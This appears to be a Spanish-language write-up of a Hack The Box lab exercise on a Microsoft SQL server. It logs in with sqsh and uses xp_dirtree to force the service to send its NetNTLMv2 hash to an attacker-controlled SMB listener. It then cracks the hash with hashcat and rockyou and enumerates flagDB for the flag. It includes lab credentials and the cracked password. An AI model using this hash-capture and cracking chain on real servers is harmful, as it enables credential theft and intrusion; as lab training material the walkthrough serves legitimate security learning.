# Credentials - SQL

## What is the password the "mssqlsvc" user?

- Nos conectamos a la máquina vía SQL con `sqsh`: 
	
	```bash 
	sqsh -S $target -U htbdbuser -P 'MSSQLAccess01!' -h
	```
- Solo tenemos acceso a algunas bases de datos, pero no a todas, por lo que no conseguimos extraer ninguna información importante de las bases de datos, por lo que capturamos el hash del usuariom `ssqlserver`. Nos ponemos en escucha (puede ser con `responder` o con `impacket-server`)
	
	```bash
	sudo impacket-smbserver share ./ -smb2support
	```

	y a continuación tratamos de conectarnos a un recurso compartido desde `sqsh`

	```sql
	EXEC xp_dirtree '\\10.10.14.91\share\';
	GO
	```

- Con el hash obtenido (hacemos una copia de todo lo obtenido y lo guardamos en capturaHash)

	```bash
	cat capturaHash | grep mssqlsvc:: | tr -d '[*] ' > hashSQL
	```

	aplicamos fuerza bruta (no funciona la lista de passwords que nos dan)

	```bash
	hashcat -m 5600 hashSQL /usr/share/wordlists/rockyou.txt
	```

	encontrando como pass `princess1`

##  Enumerate the "flagDB" database and submit a flag as your answer.

- Nos conectamos con la contraseña obtenida

	```bash
	python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py mssqlsvc@$target -p 1433 -windows-auth
	```

- Enumeramos la base de datos 

	```sql
	SELECT name FROM master.dbo.sysdatabases
	# Tras comprobar quee está el la base de datos flagDB
	use flagDB
	SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES
	# Encontramos la tabla tb_flag
	SELECT * FROM tb_flag
	```

	Encontrando la flag

